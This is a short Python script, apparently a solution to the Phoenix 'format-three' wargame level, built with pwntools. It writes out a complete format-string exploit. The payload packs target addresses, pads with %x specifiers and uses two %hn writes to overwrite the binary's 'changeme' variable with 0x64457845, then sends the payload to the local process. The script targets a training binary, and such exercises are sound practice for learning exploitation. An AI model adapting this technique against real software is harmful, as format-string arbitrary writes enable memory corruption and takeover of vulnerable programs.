#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/i486/format-three"
context.binary = path

# changeme goal = 0x64457845
# in memory: LO< | 45 78 | 45 64 | > HI
#                (0x7845) (0x6445)
# write second part first, %hn at a time

count1 = 0x6445 - (4 * 3 + 10 * 8)
count2 = 0x7845 - 0x6445

payload = pack(context.binary.symbols["changeme"] + 2)
payload += pack(0xDEADBEEF)  # padding for the %x between %hn's
payload += pack(context.binary.symbols["changeme"])
payload += b"%08x" * 10
payload += b"%0" + str(count1).encode("ascii") + b"x"
payload += b"%hn"
payload += b"%0" + str(count2).encode("ascii") + b"x"
payload += b"%hn"

io = process(path)
print(io.recvline())  # Welcome
io.sendline(payload)
io.recvline()  # printf
print(io.recvline())  # result
